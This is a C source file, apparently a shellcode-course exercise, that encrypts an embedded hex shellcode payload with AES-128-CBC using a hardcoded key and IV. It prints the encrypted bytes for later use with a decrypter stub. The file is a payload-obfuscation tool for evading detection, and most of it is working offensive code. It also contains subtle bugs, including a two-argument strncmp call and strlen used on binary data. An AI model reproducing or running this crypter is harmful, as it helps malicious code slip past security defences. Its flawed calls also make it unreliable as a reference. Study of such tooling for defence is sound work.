#include <stdio.h>

#include <mcrypt.h>
#include <math.h>
#include <stdint.h>
#include <stdlib.h>

/**
 * encrypter.c
 * Student Id: SLAE-1058
 * Original version from:
 * 	-> https://gist.github.com/bricef/2436364
 * compile: gcc test.c -o test /usr/lib/libmcrypt.a
 * */


unsigned char* initialize(unsigned char *buffer, int buf_size)
{
	int i = 0;
	for (i = 0; i < buf_size; i++)
	{
		buffer[i] = 0x90;
	}
}


void print_shellcode(unsigned char *shellcode, int len) {
    int i;

    for (i = 0; i < len; i++) {
        printf("\\x%02x", *(shellcode + i));
    }

    printf("\n\n");
}

int encrypt(
	void* buffer,
	int buffer_len, /* Because the plaintext could include null bytes*/
	char* IV,
	char* key,
	int key_len
){
	// Open the cipher
	MCRYPT td = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL);
	
	
	int blocksize = mcrypt_enc_get_block_size(td);
	if( buffer_len % blocksize != 0 ){
		return 1;
	}
	
	/** Initialize encryption **/
	mcrypt_generic_init(td, key, key_len, IV);
	
	/* Encrypt data */
	mcrypt_generic(td, buffer, buffer_len);

	/** Terminate encryption handler **/
	mcrypt_generic_deinit (td);
	
	
	mcrypt_module_close(td);
	return 0;
}


int decrypt(
	void* buffer,
	int buffer_len,
	char* IV,
	char* key,
	int key_len
){
	MCRYPT td = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL);
	int blocksize = mcrypt_enc_get_block_size(td);
	if( buffer_len % blocksize != 0 ){return 1;}
	mcrypt_generic_init(td, key, key_len, IV);
	mdecrypt_generic(td, buffer, buffer_len);
	mcrypt_generic_deinit (td);
	mcrypt_module_close(td);
	return 0;
}


/**
 * Receive the shellcode as argument.
 * Returns the number closest to 16,32,64 etc. based on shellcode's length
 * */
int get_dynamic_length(int shellcode_length)
{
	// increase in case the shellcode's length is higher than 1024
	int list[] = {16, 32, 64, 128, 256, 512, 1024};
	int list_length = sizeof(list)/sizeof(int);
	int i;
	int modulus;

	for (i = 0; i < list_length; i++)
	{
		modulus = shellcode_length % list[i];
		if (modulus == shellcode_length)
		{
			return list[i];
		}
	}
	
	return -1;
}



int main(int argc, char **argv)
{

	MCRYPT td, td2;
	
	int counter;
	
	unsigned char *shellcode = \
	"\xda\xd6\xbf\x90\x3c\x14\xaa\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
	"\x1f\x31\x7e\x1a\x83\xee\xfc\x03\x7e\x16\xe2\x65\x56\x1e\xf4"
	"\xb4\x7c\xe9\xeb\xe5\xc1\x45\x86\x0b\x76\x0f\xdf\xea\xbb\x50"
	"\x48\xb7\x2b\x91\xdf\x47\x14\x79\x22\x47\x68\x57\xab\xa6\x1a"
	"\xc1\xf3\x78\x8a\x5a\x8d\x99\x6f\xa8\x0d\xdc\xb0\x4b\x17\x90"
	"\x44\x91\x4f\x8e\xa5\xe9\x8f\x96\xcf\xe9\xe5\x23\x99\x09\xc8"
	"\xe2\x54\x4d\xae\x34\x1f\xf3\x5a\x93\x52\x0c\x24\xdb\x82\x13"
	"\x56\x52\x41\xd2\xbd\x68\x47\x36\x4d\xc0\x3a\x74\xce\xa5\x05"
	"\xfe\xdf\xfe\x0c\x1e\x46\xb6\x03\x51\x7a\x7b\x9b\x14\xbd\xfb"
	"\x9e\xe9\xdf\x43\x9f\x15\x20\xb3\x1b\x14\x20\xb3\x5b\xda\xa0";

	char* IV = "AAAAAAAAAAAAAAAA";		//16
	char *key = "0123456789abcdef";		//16
	int keysize = 16; /* 128 bits */
	
	
	
	int shellcode_len;
	shellcode_len = strlen(shellcode);
	
	/** buffer_len has to be multiple of 16.
	 * get_dynamic_length returns the multiple closest
	 * to the length of the shellcode **/
	int buffer_len = get_dynamic_length(shellcode_len);
	
	if (buffer_len == -1)
	{
		printf("[-] Invalid shellcode size, You should increase the size in get_dynamic_length()\n");
		return 1;
	}
	
	unsigned char buffer[buffer_len];
	
	/** Initialize buffer with nops **/
	initialize(buffer, buffer_len);

	strncpy(buffer, shellcode, buffer_len);
	

	if (encrypt(buffer, buffer_len, IV, key, keysize) == 1)
	{
		printf("\n\n[-] Some error ocurred in encrypt(). Shellcode length: %d\n", buffer_len);
		return 1;
	}
	
	printf("\n[x] Encrypted Shellcode\n\n"); 
	print_shellcode(buffer, buffer_len);

	decrypt(buffer, buffer_len, IV, key, keysize);
	
	if (strncmp(buffer,shellcode) == 0)
	{
		printf("[x] Initial shellcode and decrypted shellcode are equal\n");
		printf("[x] Set SHELLCODE_LENGTH %d to the decrypter shellcode_length\n\n", buffer_len);
		return 0;
	} else {
		printf("[!] Initial shellcode and decrypted shellcode are different!\n\n");
		return 1;
	}

}
